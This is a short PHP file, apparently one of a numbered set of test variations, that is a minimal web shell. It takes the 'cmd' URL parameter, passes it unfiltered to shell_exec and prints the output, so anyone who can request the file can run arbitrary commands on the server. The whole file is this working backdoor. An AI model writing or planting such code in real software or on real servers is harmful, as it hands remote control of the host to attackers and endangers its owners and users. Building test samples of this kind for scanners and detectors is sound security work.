<?php
// RCE test variation #57
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>